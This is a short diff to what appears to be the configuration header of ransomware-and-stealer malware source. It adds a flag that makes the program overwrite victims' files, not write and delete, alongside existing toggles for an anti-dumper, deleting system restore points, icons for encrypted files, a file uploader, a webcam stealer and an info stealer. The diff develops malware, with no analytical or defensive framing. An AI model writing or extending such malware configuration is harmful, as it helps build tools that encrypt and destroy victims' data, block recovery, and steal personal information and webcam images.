@@ -58,6 +58,7 @@
 #define ANTI_DUMPER			true	// Enable or disable anti-dumper
 #define DELETE_RESTOREPOINT false	// Enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// Enable or disable custom icon for encrypted files
+#define OVERWRITING			true	// Enable or disable overwriting files instead of writing and deleting
 #define FILE_UPLOADER		false	// Enable or disable file uploader
 #define TAKE_WEBCAMS		true	// Enable or disable webcam stealer
 #define STEAL_INFO			true	// Enable or disable info stealer
